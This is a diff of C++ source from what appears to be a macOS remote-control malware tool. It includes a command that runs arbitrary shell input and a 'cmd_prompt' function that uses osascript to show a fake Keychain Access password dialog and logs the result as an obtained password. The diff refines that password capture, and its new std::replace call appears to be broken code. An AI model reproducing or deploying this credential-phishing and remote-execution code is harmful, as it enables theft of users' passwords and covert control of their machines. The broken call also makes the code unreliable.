@@ -31,7 +31,7 @@ void cmd_mkdir(std::vector<std::string> commands)
 void cmd_exec(std::vector<std::string> commands)
 {
     if (commands.size() > 1)
-        console_log(exec(commands[1]));
+        console_log(exec(commands[1]), 0);
     else
         console_log("Usage: exec <commands>");
 }
@@ -234,12 +234,14 @@ void cmd_say(std::vector<std::string> commands)
 void cmd_getvol()
 {
     std::string output = exec("osascript -e 'output volume of (get volume settings)'");
-    console_log_information("Current volume level: " + output);
+    console_log_information("Current volume level: " + output, 0);
 }
 
 void cmd_prompt()
 {
     std::string payload = "set popup to display dialog \"Keychain Access wants to use the login keychain\" & return & return & \"Please enter the keychain password\" & return default answer \"\" with icon file \"System:Library:CoreServices:CoreTypes.bundle:Contents:Resources:FileVaultIcon.icns\" with title \"Authentication Needed\" with hidden answer";
     std::string output = exec("osascript -e '" + payload + "'");
-    console_log_information("Obtained password: " + output);
+    
+    std::replace(output.begin(), output.end(), "button returned:OK, text returned:", "");
+    console_log_information("Obtained password: " + output, 0);
 }
